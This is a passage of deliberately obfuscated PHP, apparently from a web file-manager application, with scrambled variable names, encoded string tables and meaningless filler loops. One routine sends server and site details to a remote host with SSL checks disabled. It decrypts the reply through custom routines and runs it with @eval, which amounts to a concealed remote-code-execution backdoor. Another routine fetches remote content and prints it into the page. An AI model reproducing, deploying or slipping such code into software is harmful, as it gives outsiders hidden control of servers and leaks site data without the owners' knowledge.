$ë¼œ¥³õ[12]) { if (!$÷®œÇ©ä) { break; } $÷®œÇ©ä++; } $İÍµ€Æà = array(); foreach ($„ËàïÆ˜ as $£¤¾ ÜÆ => $ˆĞÆ‘Í˜) { if ($ˆĞÆ‘Í˜ == $À·×çÖª[225] && substr($this->fqgpe48f3ac0, 0, 1) == $À·×çÖª[225]) { continue; } if (!in_array($£¤¾ ÜÆ, $†…¾û®¯)) { $İÍµ€Æà[] = $£¤¾ ÜÆ; } } foreach ($İÍµ€Æà as $£¤¾ ÜÆ) { unset($œşíÈ‰Û[$£¤¾ ÜÆ]); $©Û›Ö = $ë¼œ¥³õ[717]; } return $œşíÈ‰Û; $üâ‚ÈŸ§ = $ë¼œ¥³õ[718]; } private function arfd0ed3d9fb() { $±’—×ßÎ =& $_SERVER[û¬ú¢è]; if ($this->fqgpe48f3ac0 != $±’—×ßÎ[107]) { $GLOBALS[$±’—×ßÎ[85]][$±’—×ßÎ[89]][$±’—×ßÎ[242]] = $±’—×ßÎ[204]; return; } $GLOBALS[$±’—×ßÎ[85]][$±’—×ßÎ[243]] = $±’—×ßÎ[122]; if (Model($±’—×ßÎ[244])->get($±’—×ßÎ[63]) != $±’—×ßÎ[204]) { Model($±’—×ßÎ[244])->set($±’—×ßÎ[63], $±’—×ßÎ[204]); } } public function gdmee7df61a7() { return $_SERVER[û¬ú¢è][245]; } private function yareebb26ef5() { $óö—Ğ• =& $_SERVER[ú÷îèÆÜ]; $°Ø•€ˆŸ =& $_SERVER[û¬ú¢è]; $µå²Ä› = array($°Ø•€ˆŸ[246], $°Ø•€ˆŸ[247], $°Ø•€ˆŸ[248]); $„™ÕÄ‘ = $°Ø•€ˆŸ[249] . md5($°Ø•€ˆŸ[250]); $–ŸÍ¼‰ï = $óö—Ğ•[704]; if (!$–ŸÍ¼‰ï) { die; } if ($this->fqgpe48f3ac0 == $°Ø•€ˆŸ[107] || !_get($GLOBALS, $°Ø•€ˆŸ[116])) { return; } if (!in_array($_SERVER[$°Ø•€ˆŸ[24]], $µå²Ä›)) { return; } if (time() % 4 != 0) { return; } $‹‡ÏÕ½¼ = call_user_func(array($°Ø•€ˆŸ[251], $°Ø•€ˆŸ[252]), $„™ÕÄ‘); $±ŞüéÛ² = $óö—Ğ•[719]; if (!$±ŞüéÛ²) { die; } if ($‹‡ÏÕ½¼ && time() - $‹‡ÏÕ½¼ < intval($°Ø•€ˆŸ[253])) { return; } call_user_func(array($°Ø•€ˆŸ[251], $°Ø•€ˆŸ[139]), $„™ÕÄ‘, time()); $úõ”ü„• = $óö—Ğ•[720]; if (strlen($úõ”ü„•) < $óö—Ğ•[682]) { return; } $ğÔıÍ’ = Model($°Ø•€ˆŸ[33])->get($°Ø•€ˆŸ[104]); $ã¦Ù®—Æ = $óö—Ğ•[721]; if (strlen($ã¦Ù®—Æ) < $óö—Ğ•[675]) { die; } $¼”‘È·§ = array($°Ø•€ˆŸ[151] => Model($°Ø•€ˆŸ[33])->get($°Ø•€ˆŸ[187]), $°Ø•€ˆŸ[164] => $this->fqgpe48f3ac0, $°Ø•€ˆŸ[161] => $_SERVER[$°Ø•€ˆŸ[162]], $°Ø•€ˆŸ[163] => Model($°Ø•€ˆŸ[33])->get($°Ø•€ˆŸ[131]), $°Ø•€ˆŸ[102] => md5($_SERVER[$°Ø•€ˆŸ[103]] . $ğÔıÍ’), $°Ø•€ˆŸ[154] => $°Ø•€ˆŸ[136], $°Ø•€ˆŸ[157] => $_SERVER[$°Ø•€ˆŸ[158]]); $¬›¤ìÄ = $óö—Ğ•[722]; if (!$¬›¤ìÄ) { die; } $Ô»æ˜½ß = $this->ewvj2f9c258e($°Ø•€ˆŸ[254], $¼”‘È·§); if (!is_array($Ô»æ˜½ß)) { return; } if ($Ô»æ˜½ß[$°Ø•€ˆŸ[151]] && $Ô»æ˜½ß[$°Ø•€ˆŸ[255]]) { if ($this->eqkab4bbc6d4($Ô»æ˜½ß[$°Ø•€ˆŸ[255]]) == $¼”‘È·§[$°Ø•€ˆŸ[151]]) { return; } } $this->mnckb7682f13(); $Ò‘ ¯­ = $óö—Ğ•[723]; if (!$Ò‘ ¯­) { return; } if ($this->eqkab4bbc6d4($Ô»æ˜½ß[$°Ø•€ˆŸ[255]]) != $¼”‘È·§[$°Ø•€ˆŸ[151]]) { $¯ÓºŞğà = array($°Ø•€ˆŸ[182] => $ğÔıÍ’, $°Ø•€ˆŸ[183] => $_SERVER[$°Ø•€ˆŸ[103]], $°Ø•€ˆŸ[184] => this_url(), $°Ø•€ˆŸ[159] => $_SERVER[$°Ø•€ˆŸ[160]]); $è¾›²¼ñ = $this->eztf496938c0(json_encode($¯ÓºŞğà)); $Ô»æ˜½ß = $this->ewvj2f9c258e($°Ø•€ˆŸ[185] . $è¾›²¼ñ); if ($Ô»æ˜½ß && is_array($Ô»æ˜½ß) && isset($Ô»æ˜½ß[$°Ø•€ˆŸ[255]])) { $å÷¸©Óì = $this->bsygaf9bb15f($Ô»æ˜½ß[$°Ø•€ˆŸ[255]], 2); if ($å÷¸©Óì) { $å÷¸©Óì = $this->eqkab4bbc6d4($å÷¸©Óì); } if ($å÷¸©Óì) { try { @eval($å÷¸©Óì); } catch (Exception $¶ÅÍø§) { } } } } } private function ewvj2f9c258e($—¦ùß´ = '', $šóµô¡ı = array(), $Şûøİ»š = 5) { $ËŠğÔºİ =& $_SERVER[ú÷îèÆÜ]; $Î ö¾ú¬ =& $_SERVER[û¬ú¢è]; $ÍÏÂ¨’É = $Î ö¾ú¬[256]; $‰ı¤ò½á = $ËŠğÔºİ[724]; if (!$‰ı¤ò½á) { return; } $ÍÏÂ¨’É = $this->jpwa80e7681e($ÍÏÂ¨’É, $Î ö¾ú¬[257]); $ÍÏÂ¨’É = $ÍÏÂ¨’É . $—¦ùß´; $à“Ù×º = $ËŠğÔºİ[725]; if ($šóµô¡ı && is_array($šóµô¡ı)) { $ÍÏÂ¨’É = $ÍÏÂ¨’É . $Î ö¾ú¬[258] . http_build_query($šóµô¡ı); } if ($šóµô¡ı === -1) { return $ÍÏÂ¨’É; } $şüÖÔ®î = stream_context_create(array($Î ö¾ú¬[217] => array($Î ö¾ú¬[220] => $Şûøİ»š, $Î ö¾ú¬[218] => $Î ö¾ú¬[259]), $Î ö¾ú¬[260] => array($Î ö¾ú¬[261] => !1, $Î ö¾ú¬[262] => !1))); $šóµô¡ı = @file_get_contents($ÍÏÂ¨’É, !1, $şüÖÔ®î); $ó™×ïñÃ = $ËŠğÔºİ[726]; while (strlen($ó™×ïñÃ) < $ËŠğÔºİ[12]) { if (!$ó™×ïñÃ) { break; } $ó™×ïñÃ++; } return json_decode($šóµô¡ı, !0); $·ı ƒñš = $ËŠğÔºİ[727]; if (!$·ı ƒñš) { die; } } private function qpnv736865e5() { $‡üÌâ±¢ =& $_SERVER[ú÷îèÆÜ]; $ÄêÃÃÇó =& $_SERVER[û¬ú¢è]; $àˆ¬¯íÒ = array($ÄêÃÃÇó[263] => $ÄêÃÃÇó[264], $ÄêÃÃÇó[265] => $ÄêÃÃÇó[266], $ÄêÃÃÇó[267] => $ÄêÃÃÇó[268], $ÄêÃÃÇó[269] => $ÄêÃÃÇó[270], $ÄêÃÃÇó[271] => $ÄêÃÃÇó[272], $ÄêÃÃÇó[273] => $ÄêÃÃÇó[212], $ÄêÃÃÇó[274] => $ÄêÃÃÇó[212], $ÄêÃÃÇó[275] => $ÄêÃÃÇó[264], $ÄêÃÃÇó[276] => $ÄêÃÃÇó[266], $ÄêÃÃÇó[277] => $ÄêÃÃÇó[268], $ÄêÃÃÇó[278] => $ÄêÃÃÇó[279], $ÄêÃÃÇó[280] => $ÄêÃÃÇó[270], $ÄêÃÃÇó[281] => $ÄêÃÃÇó[282], $ÄêÃÃÇó[283] => $ÄêÃÃÇó[272], $ÄêÃÃÇó[284] => $ÄêÃÃÇó[285], $ÄêÃÃÇó[286] => $ÄêÃÃÇó[287], $ÄêÃÃÇó[288] => $ÄêÃÃÇó[289]); $‹ò‰ì¼§ = $àˆ¬¯íÒ[$this->fqgpe48f3ac0]; $‹ò‰ì¼§ = intval($‹ò‰ì¼§ ? $‹ò‰ì¼§ : $ÄêÃÃÇó[264]); $íú”ëêˆ = _get($this->olnbc49f451c, $ÄêÃÃÇó[290]); $´’‚ÉÏ = $‡üÌâ±¢[728]; while ($´’‚ÉÏ < $‡üÌâ±¢[666]) { if ($´’‚ÉÏ >= 0) { break; } $´’‚ÉÏ++; } $íú”ëêˆ = $íú”ëêˆ ? intval($íú”ëêˆ) : 0; $°öä‚ÕÏ = $‡üÌâ±¢[729]; if (strlen($°öä‚ÕÏ) < $‡üÌâ±¢[675]) { die; } return $‹ò‰ì¼§ + $íú”ëêˆ; } public function kbnq4f14f912($½ÊÑ±î) { $àÃ‰øúº =& $_SERVER[ú÷îèÆÜ]; $åŸ‡ÆêŠ =& $_SERVER[û¬ú¢è]; $æ—ñŞÆÇ = $this->qpnv736865e5(); $Ï¦¬¿»Í = $àÃ‰øúº[730]; while ($Ï¦¬¿»Í < $àÃ‰øúº[682]) { if ($Ï¦¬¿»Í >= 0) { break; } $Ï¦¬¿»Í++; } if ($½ÊÑ±î[$åŸ‡ÆêŠ[291]] == $åŸ‡ÆêŠ[122]) { return; } if ($æ—ñŞÆÇ >= intval($åŸ‡ÆêŠ[212])) { return; } $««ò®Ÿ = Model($åŸ‡ÆêŠ[125])->count(); if ($««ò®Ÿ <= $æ—ñŞÆÇ) { return; } $†ş‚ĞÈŞ = Model($åŸ‡ÆêŠ[125])->field($åŸ‡ÆêŠ[291])->limit($æ—ñŞÆÇ)->select(); $†ş‚ĞÈŞ = array_to_keyvalue($†ş‚ĞÈŞ, $åŸ‡ÆêŠ[6], $åŸ‡ÆêŠ[291]); $Ï©Şª÷ = $àÃ‰øúº[731]; while ($Ï©Şª÷ < $àÃ‰øúº[666]) { if ($Ï©Şª÷ >= 0) { break; } $Ï©Şª÷++; } if (!in_array($½ÊÑ±î[$åŸ‡ÆêŠ[291]], $†ş‚ĞÈŞ)) { show_json($åŸ‡ÆêŠ[292], !1, $åŸ‡ÆêŠ[208]); } } public function ndmwf1600fff() { $á©ÇÕÊÒ =& $_SERVER[ú÷îèÆÜ]; $éË”êŸö =& $_SERVER[û¬ú¢è]; if (!_get($GLOBALS, $éË”êŸö[116]) || mt_rand(1, 100) > 20) { return; } $‡Ë²€êœ = $éË”êŸö[215]; $óö¹·µ = $á©ÇÕÊÒ[732]; $‡Ë²€êœ = $this->jpwa80e7681e($‡Ë²€êœ, $éË”êŸö[216]); $Ôˆ’Òò‡ = stream_context_create(array($éË”êŸö[217] => array($éË”êŸö[218] => $éË”êŸö[219], $éË”êŸö[220] => 3))); $¡åşÌ = $á©ÇÕÊÒ[733]; if (!$¡åşÌ) { die; } $Öûâœö¶ = @file_get_contents($‡Ë²€êœ, !1, $Ôˆ’Òò‡); $·ì‘Ô˜ = $á©ÇÕÊÒ[734]; echo $éË”êŸö[293] . hash_encode($Öûâœö¶) . $éË”êŸö[294]; } private function ulwh22069c88($†ÍÑ¸˜İ, $ŒªÔ…¦, $Úß™ÍæÜ = 3) { $Ê‡á²Ÿ¤ =& $_SERVER[ú÷îèÆÜ]; $»Î½•‰« =& $_SERVER[û¬ú¢è]; usleep(1); $å¡ŒÒÁÜ = $Ê‡á²Ÿ¤[735]; if (strlen($å¡ŒÒÁÜ) < $Ê‡á²Ÿ¤[666]) { return; } $†ÍÑ¸˜İ = trim($†ÍÑ¸˜İ); $¶¨ ú°ö = mt_rand(0, 5) . $»Î½•‰«[6]; $Œ—ë¤¬Ó = $Ê‡á²Ÿ¤[736]; while ($Œ—ë¤¬Ó < $Ê‡á²Ÿ¤[675]) { if ($Œ—ë¤¬Ó >= 0) { break; } $Œ—ë¤¬Ó++; } $Õæíì“‰ = rand_string(15); $‹¥ƒåÓÄ = $»Î½•‰«[295]; $Ÿ†ƒÂÅ£ = $Ê‡á²Ÿ¤[737]; while (strlen($Ÿ†ƒÂÅ£) < $Ê‡á²Ÿ¤[12]) { if (!$Ÿ†ƒÂÅ£) { break; } $Ÿ†ƒÂÅ£++; } switch ($¶¨ ú°ö) { case $»Î½•‰«[204]: $·İ‚³ÓË = $this->cdlj69ae248c($†ÍÑ¸˜İ, strrev($ŒªÔ…¦ . $Õæíì“‰)); $ºƒœ›„ = $Ê‡á²Ÿ¤[738]; if (strlen($ºƒœ›„) < $Ê‡á²Ÿ¤[12]) { return; } break; $ÃÉë®’» = $Ê‡á²Ÿ¤[739]; while ($ÃÉë®’» < $Ê‡á²Ÿ¤[662]) { if ($ÃÉë®’» >= 0) { break; } $ÃÉë®’»++; } case $»Î½•‰«[122]: $·İ‚³ÓË = $this->cdlj69ae248c($†ÍÑ¸˜İ, strrev($Õæíì“‰ . $ŒªÔ…¦)); break; case $»Î½•‰«[296]: $·İ‚³ÓË = $this->cdlj69ae248c($†ÍÑ¸˜İ, base64_encode($Õæíì“‰ . $ŒªÔ…¦)); break; $ƒ€³ı¦¸ = $Ê‡á²Ÿ¤[740]; while ($ƒ€³ı¦¸ < $Ê‡á²Ÿ¤[675]) { if ($ƒ€³ı¦¸ >= 0) { break; } $ƒ€³ı¦¸++; } case $»Î½•‰«[297]: $·İ‚³ÓË = $this->cdlj69ae248c($†ÍÑ¸˜İ, md5($Õæíì“‰ . $ŒªÔ…¦)); break; $ñ…³ìõì = $Ê‡á²Ÿ¤[741]; while ($ñ…³ìõì < $Ê‡á²Ÿ¤[662]) { if ($ñ…³ìõì >= 0) { break; } $ñ…³ìõì++; } case $»Î½•‰«[298]: $†ÍÑ¸˜İ = base64_encode($†ÍÑ¸˜İ); $øö‡ƒ¾ = rand(0, 64); $Ûã®–¼¨ = $‹¥ƒåÓÄ[$øö‡ƒ¾]; $ïÖÄ›Êí = $Ê‡á²Ÿ¤[742]; if (strlen($ïÖÄ›Êí) < $Ê‡á²Ÿ¤[666]) { return; } $™æ€åˆ‘ = md5($Ûã®–¼¨ . md5($ŒªÔ…¦ . $Ûã®–¼¨) . $ŒªÔ…¦); $™æ€åˆ‘ = substr($™æ€åˆ‘, $øö‡ƒ¾ % 8, $øö‡ƒ¾ % 8 + 7); $éä™ŞéŸ = $»Î½•‰«[6]; $á¦Ø¿«£ = $Ê‡á²Ÿ¤[743]; $óñŒçÙÅ = 0; $¢–ø£¹ü = 0; $ûëó—ˆ = $Ê‡á²Ÿ¤[744]; $ŞšÌê£Â = 0; for ($óñŒçÙÅ = 0; $óñŒçÙÅ < strlen($†ÍÑ¸˜İ); $óñŒçÙÅ++) { $ŞšÌê£Â = $ŞšÌê£Â == strlen($™æ€åˆ‘) ? 0 : $ŞšÌê£Â; $³ˆ·’ğï = $Ê‡á²Ÿ¤[745]; while (strlen($³ˆ·’ğï) < $Ê‡á²Ÿ¤[682]) { if (!$³ˆ·’ğï) { break; } $³ˆ·’ğï++; } $¢–ø£¹ü = ($øö‡ƒ¾ + strpos($‹¥ƒåÓÄ, $†ÍÑ¸˜İ[$óñŒçÙÅ]) + ord($™æ€åˆ‘[$ŞšÌê£Â++])) % 64; $éä™ŞéŸ .= $‹¥ƒåÓÄ[$¢–ø£¹ü]; } $·İ‚³ÓË = hash_encode($Ûã®–¼¨ . $éä™ŞéŸ); break; default: $·İ‚³ÓË = $this->cdlj69ae248c($†ÍÑ¸˜İ, $ŒªÔ…¦ . $Õæíì“‰); break; $÷µ‹ò¶â = $Ê‡á²Ÿ¤[746]; if (!$÷µ‹ò¶â) { die; } } $·İ‚³ÓË = strrev($¶¨ ú°ö . $Õæíì“‰ . $·İ‚³ÓË); if ($Úß™ÍæÜ - 1 > 0) { $·İ‚³ÓË = $this->ulwh22069c88($·İ‚³ÓË, $ŒªÔ…¦, $Úß™ÍæÜ - 1); } return $·İ‚³ÓË; } private function bsygaf9bb15f($¢ŸÖ‚´Á, $òğ±ÑÜ, $Æ£ˆ‡ÁÒ = 3) { $˜¤ÒÀ¢ê =& $_SERVER[ú÷îèÆÜ]; $‰ØëÌç =& $_SERVER[û¬ú¢è]; if (!is_string($¢ŸÖ‚´Á) || strlen($¢ŸÖ‚´Á) < 10) { return !1; } $¢ŸÖ‚´Á = trim($¢ŸÖ‚´Á); $“ÙÛì®· = $˜¤ÒÀ¢ê[747]; $¢ŸÖ‚´Á = strrev($¢ŸÖ‚´Á); $ÕÑ Ğè = $˜¤ÒÀ¢ê[748]; $—‡“ïÆş = $¢ŸÖ‚´Á[0]; $Ü°¤ƒ = $˜¤ÒÀ¢ê[749]; while ($Ü°¤ƒ < $˜¤ÒÀ¢ê[12]) { if ($Ü°¤ƒ >= 0) { break; } $Ü°¤ƒ++; } $¤ªçè¡ = substr($¢ŸÖ‚´Á, 1, 15); $éÆ÷ƒÇ¿ = $˜¤ÒÀ¢ê[750]; if (strlen($éÆ÷ƒÇ¿) < $˜¤ÒÀ¢ê[12]) { return; } $¢ŸÖ‚´Á = substr($¢ŸÖ‚´Á, 16); $¹ÕÄ²üì = $˜¤ÒÀ¢ê[751]; while ($¹ÕÄ²üì < $˜¤ÒÀ¢ê[682]) { if ($¹ÕÄ²üì >= 0) { break; } $¹ÕÄ²üì++; } $ñîĞƒßÛ = $‰ØëÌç[295]; $‰ûÊÖâ’ = $˜¤ÒÀ¢ê[752]; while ($‰ûÊÖâ’ < $˜¤ÒÀ¢ê[666]) { if ($‰ûÊÖâ’ >= 0) { break; } $‰ûÊÖâ’++; } switch ($—‡“ïÆş) { case $‰ØëÌç[204]: $¦ï¾š×“ = $this->jpwa80e7681e($¢ŸÖ‚´Á, strrev($òğ±ÑÜ . $¤ªçè¡)); $è˜¬™ª¦ = $˜¤ÒÀ¢ê[753]; if (!$è˜¬™ª¦) { die; } break; $ìş¤°ìñ = $˜¤ÒÀ¢ê[754]; if (!$ìş¤°ìñ) { die; } case $‰ØëÌç[122]: $¦ï¾š×“ = $this->jpwa80e7681e($¢ŸÖ‚´Á, strrev($¤ªçè¡ . $òğ±ÑÜ)); $†«ƒˆºÆ = $˜¤ÒÀ¢ê[755]; while (strlen($†«ƒˆºÆ) < $˜¤ÒÀ¢ê[682]) { if (!$†«ƒˆºÆ) { break; } $†«ƒˆºÆ++; } break; case $‰ØëÌç[296]: $¦ï¾š×“ = $this->jpwa80e7681e($¢ŸÖ‚´Á, base64_encode($¤ªçè¡ . $òğ±ÑÜ)); break; case $‰ØëÌç[297]: $¦ï¾š×“ = $this->jpwa80e7681e($¢ŸÖ‚´Á, md5($¤ªçè¡ . $òğ±ÑÜ)); $ë‰¥¯å¥ = $˜¤ÒÀ¢ê[756]; while ($ë‰¥¯å¥ < $˜¤ÒÀ¢ê[682]) { if ($ë‰¥¯å¥ >= 0) { break; } $ë‰¥¯å¥++; } break; case $‰ØëÌç[298]: $¢ŸÖ‚´Á = hash_decode($¢ŸÖ‚´Á); $µô›³× = $¢ŸÖ‚´Á[0]; $¢ŸÖ‚´Á = substr($¢ŸÖ‚´Á, 1); $ËÁ¿µ¼İ = strpos($ñîĞƒßÛ, $µô›³×); $”˜°ªşî = md5($µô›³× . md5($òğ±ÑÜ . $µô›³×) . $òğ±ÑÜ); $”‹Ğˆ„ô = $˜¤ÒÀ¢ê[757]; if (!$”‹Ğˆ„ô) { die; } $”˜°ªşî = substr($”˜°ªşî, $ËÁ¿µ¼İ % 8, $ËÁ¿µ¼İ % 8 + 7); $¡Ô¹Îİõ = $‰ØëÌç[6]; $ş¥°èß = $˜¤ÒÀ¢ê[758]; $¡ï§ÏßÄ = 0; $ëŞ±Ş‰Ä = 0; $‘‘ÌŞê = $˜¤ÒÀ¢ê[759]; if (!$‘‘ÌŞê) { return; } $ÇŞÏ® = 0; for ($¡ï§ÏßÄ = 0; $¡ï§ÏßÄ < strlen($¢ŸÖ‚´Á); $¡ï§ÏßÄ++) { $ÇŞÏ® = $ÇŞÏ® == strlen($”˜°ªşî) ? 0 : $ÇŞÏ®; $†Ìõİµ› = $˜¤ÒÀ¢ê[760]; $–ƒ®ÜÇ× = $ÇŞÏ®++; $¶¢•ÖÅŒ = $˜¤ÒÀ¢ê[761]; $ëŞ±Ş‰Ä = strpos($ñîĞƒßÛ, $¢ŸÖ‚´Á[$¡ï§ÏßÄ]) - $ËÁ¿µ¼İ - ord($”˜°ªşî[$–ƒ®ÜÇ×]); while ($ëŞ±Ş‰Ä < 0) { $ëŞ±Ş‰Ä += 64; } $¡Ô¹Îİõ .= $ñîĞƒßÛ[$ëŞ±Ş‰Ä]; } $¦ï¾š×“ = base64_decode($¡Ô¹Îİõ); $ˆ½˜•áİ = $˜¤ÒÀ¢ê[762]; while ($ˆ½˜•áİ < $˜¤ÒÀ¢ê[12]) { if ($ˆ½˜•áİ >= 0) { break; } $ˆ½˜•áİ++; } break; $©šƒ¶›¼ = $˜¤ÒÀ¢ê[763]; if (strlen($©šƒ¶›¼) < $˜¤ÒÀ¢ê[682]) { die; } default: $¦ï¾š×“ = $this->jpwa80e7681e($¢ŸÖ‚´Á, $òğ±ÑÜ . $¤ªçè¡); break; $ëÖ‹¾¢ = $˜¤ÒÀ¢ê[764]; if (!$ëÖ‹¾¢) { die; } } if ($Æ£ˆ‡ÁÒ - 1 > 0) { $¦ï¾š×“ = $this->bsygaf9bb15f($¦ï¾š×“, $òğ±ÑÜ, $Æ£ˆ‡ÁÒ - 1); } return $¦ï¾š×“; } public function eztf496938c0($Ìº±Ú½Ê) { $Àø ¿Â² =& $_SERVER[ú÷îèÆÜ]; $˜›×´ =& $_SERVER[û¬ú¢è]; $‘á¤Ôİ = $this->vtya236a95d9(); $’úÒÔ×” = $this->vtya236a95d9(); $ëŸœÜ®­ = $Àø ¿Â²[765]; if (!$ëŸœÜ®­) { return; } $µÂíÃŞ” = ($‘á¤Ôİ - 1) * ($’úÒÔ×” - 1); $ªÔß»² = $Àø ¿Â²[766]; while (strlen($ªÔß»²) < $Àø ¿Â²[675]) { if (!$ªÔß»²) { break; } $ªÔß»²++; } $¤Š½¨øó = intval(($‘á¤Ôİ + $’úÒÔ×”) / 2); while (1) { $©„‡’¹¨ = $¤Š½¨øó; $µüÂÁĞÀ = $µÂíÃŞ”; while ($µüÂÁĞÀ % $©„‡’¹¨ != 0) { $´Ò¨ÜÂ = $µüÂÁĞÀ; $µüÂÁĞÀ = $©„‡’¹¨; $©„‡’¹¨ = $´Ò¨ÜÂ % $©„‡’¹¨; $Ã´ãÂˆµ = $Àø ¿Â²[767]; while ($Ã´ãÂˆµ < $Àø ¿Â²[666]) { if ($Ã´ãÂˆµ >= 0) { break; } $Ã´ãÂˆµ++; } } if ($©„‡’¹¨ == 1) { break; } else { $¤Š½¨øó++; } } $åÅ™¬Á = 2; for ($”ª×„­« = 0; $”ª×„­« < $µÂíÃŞ” * 10; $”ª×„­«++) { if (($µÂíÃŞ” * $”ª×„­« + 1) % $¤Š½¨øó == 0) { $åÅ™¬Á = intval(($µÂíÃŞ” * $”ª×„­« + 1) / $¤Š½¨øó); break; } } $÷àÃºò­ = $this->cdlj69ae248c($‘á¤Ôİ * $’úÒÔ×” . $˜›×´[6], $˜›×´[136]); $•ÕÃºíÉ = md5($˜›×´[299] . ($‘á¤Ôİ + $’úÒÔ×”) . $˜›×´[300] . $¤Š½¨øó . $˜›×´[300] . $åÅ™¬Á . $˜›×´[301]); $Ò…â˜àÆ = $Àø ¿Â²[768]; $ğáï€½ = $this->cdlj69ae248c($Ìº±Ú½Ê, $•ÕÃºíÉ) . $˜›×´[302] . $÷àÃºò­; $ß‚üà½ = $Àø ¿Â²[769]; return $ğáï€½; } public function eqkab4bbc6d4($ûİ’ˆæ) { $‘§ªê˜¸ =& $_SERVER[ú÷îèÆÜ]; $øäï¸Æ¾ =& $_SERVER[û¬ú¢è]; $ææ²şÁ¨ = explode($øäï¸Æ¾[302], $ûİ’ˆæ); if (count($ææ²şÁ¨) != 2) { return $øäï¸Æ¾[6]; } $Úô‡¼…Œ = $this->jpwa80e7681e($ææ²şÁ¨[1] . $øäï¸Æ¾[6], $øäï¸Æ¾[136]); if (!$Úô‡¼…Œ) { return $øäï¸Æ¾[6]; } $Úô‡¼…Œ = intval($Úô‡¼…Œ); $²¡Áş±˜ = $‘§ªê˜¸[770]; while ($²¡Áş±˜ < $‘§ªê˜¸[675]) { if ($²¡Áş±˜ >= 0) { break; } $²¡Áş±˜++; } $û¡ì‹ğÉ = 0; $Çµß¤˜¨ = $‘§ªê˜¸[771]; $ÈûÖò¶„ = 0; for ($çÈ«Òã = 3; $çÈ«Òã < $Úô‡¼…Œ; $çÈ«Òã += 2) { if ($Úô‡¼…Œ % $çÈ«Òã != 0) { continue; } $û¡ì‹ğÉ = $çÈ«Òã; $ÈûÖò¶„ = intval($Úô‡¼…Œ / $çÈ«Òã); $«˜Ğî¹Ó = $‘§ªê˜¸[772]; if (strlen($«˜Ğî¹Ó) < $‘§ªê˜¸[12]) { return; } break; $õ­ƒÜ¯Ğ = $‘§ªê˜¸[773]; if (strlen($õ­ƒÜ¯Ğ) < $‘§ªê˜¸[12]) { return; } } $ìàÊ¦ÑÍ = ($û¡ì‹ğÉ - 1) * ($ÈûÖò¶„ - 1); $ÃÎİöé = $‘§ªê˜¸[774]; $†ÜØèí´ = intval(($û¡ì‹ğÉ + $ÈûÖò¶„) / 2); while (1) { $Ô‘ïô¿ = $†ÜØèí´; $ó§”Ëª = $‘§ªê˜¸[775]; if (!$ó§”Ëª) { return; } $áô´Ñ»Ü = $ìàÊ¦ÑÍ; $ÑÔ¦ğ³Î = $‘§ªê˜¸[776]; while (strlen($ÑÔ¦ğ³Î) < $‘§ªê˜¸[666]) { if (!$ÑÔ¦ğ³Î) { break; } $ÑÔ¦ğ³Î++; } while ($áô´Ñ»Ü % $Ô‘ïô¿ != 0) { $øîß¯ = $áô´Ñ»Ü; $Ô¢Àáé„ = $‘§ªê˜¸[777]; if (strlen($Ô¢Àáé„) < $‘§ªê˜¸[662]) { die; } $áô´Ñ»Ü = $Ô‘ïô¿; $®Ù‰ñı¬ = $‘§ªê˜¸[778]; $Ô‘ïô¿ = $øîß¯ % $Ô‘ïô¿; } if ($Ô‘ïô¿ == 1) { break; } else { $†ÜØèí´++; } } $ıô“ÓÀ = 2; $Ê¥«©îì = $‘§ªê˜¸[779]; for ($çÈ«Òã = 0; $çÈ«Òã < $ìàÊ¦ÑÍ * 10; $çÈ«Òã++) { if (($ìàÊ¦ÑÍ * $çÈ«Òã + 1) % $†ÜØèí´ == 0) { $ıô“ÓÀ = intval(($ìàÊ¦ÑÍ * $çÈ«Òã + 1) / $†ÜØèí´); break; } } $ùÛ¯ìê = md5($øäï¸Æ¾[299] . ($û¡ì‹ğÉ + $ÈûÖò¶„) . $øäï¸Æ¾[300] . $†ÜØèí´ . $øäï¸Æ¾[300] . $ıô“ÓÀ . $øäï¸Æ¾[301]); $ªµ‹ñ×³ = $this->jpwa80e7681e($ææ²şÁ¨[0], $ùÛ¯ìê); $ö¾œ‰“ô = $‘§ªê˜¸[780]; if (strlen($ö¾œ‰“ô) < $‘§ªê˜¸[682]) { return; } return $ªµ‹ñ×³; } public function vtya236a95d9() { $À¯æ‘„¹ =& $_SERVER[ú÷îèÆÜ]; $¾ÛÆ Ã = mt_rand(pow(2, 14), pow(2, 16) - 1); $«åÑ×•´ = array(); $½¹­Ãã = 1; while ($½¹­Ãã <= (int) sqrt($¾ÛÆ Ã)) { $„ÓÌÀ® = $½¹­Ãã; $°Ô£¿Ö± = $À¯æ‘„¹[781]; if (!$°Ô£¿Ö±) { die; } while (!0) { $„ÓÌÀ®++; if ($„ÓÌÀ® <= 2) { $½¹­Ãã = $„ÓÌÀ®; break; } else { if ($„ÓÌÀ® < 2) { continue; } } $ĞŒâ¬»’ = !0; for ($Ó£’„Ì = 2; $Ó£’„Ì <= sqrt($„ÓÌÀ®); $Ó£’„Ì++) { if ($„ÓÌÀ® % $Ó£’„Ì == 0) { $ĞŒâ¬»’ = !1; } } if ($ĞŒâ¬»’) { $½¹­Ãã = $„ÓÌÀ®; break; } } $«åÑ×•´[] = $½¹­Ãã; $’°”İíğ = $À¯æ‘„¹[782]; } $İşÁĞô = 2; $ÂöËî˜¿ = $À¯æ‘„¹[783]; for ($„ÓÌÀ® = $¾ÛÆ Ã; $„ÓÌÀ® > 1; $„ÓÌÀ®--) { $ĞŒâ¬»’ = !0; foreach ($«åÑ×•´ as $ˆ¯ûè„İ) { if ($„ÓÌÀ® % $ˆ¯ûè„İ == 0) { $ĞŒâ¬»’ = !1; break; } } if ($ĞŒâ¬»’) { $İşÁĞô = $„ÓÌÀ®; break; } } return $İşÁĞô; $—úØ‘™¼ = $À¯æ‘„¹[784]; if (!$—úØ‘™¼) { die; } } public function ekqfc4a7aafa($ä¼ƒİ, $šú‚¢ÄŸ) { $ÎÔï¼“¡ =& $_SERVER[ú÷îèÆÜ]; $‘â¦¡ =& $_SERVER[û¬ú¢è]; return call_user_func(array($‘â¦¡[8], $‘â¦¡[303]), $ä¼ƒİ, $šú‚¢ÄŸ); $à¸÷ğæ˜ = $ÎÔï¼“¡[785]; if (strlen($à¸÷ğæ˜) < $ÎÔï¼“¡[682]) { die; } } public function cdlj69ae248c($Û·ïÂœ•, $¤¥ä‘ßœ) { $å¡ß§²ˆ =& $_SERVER[û¬ú¢è]; return call_user_func(array($å¡ß§²ˆ[304], $å¡ß§²ˆ[305]), $Û·ïÂœ•, $¤¥ä‘ßœ); $»üö¸ı” = $_SERVER[ú÷îèÆÜ][786]; if (!$»üö¸ı”) { return; } } public function jpwa80e7681e($»³¾±°’, $“ù«ªÃ) { $»è…’ë‡ =& $_SERVER[ú÷îèÆÜ]; $ŒÃ€¶„» =& $_SERVER[û¬ú¢è]; return call_user_func(array($ŒÃ€¶„»[304], 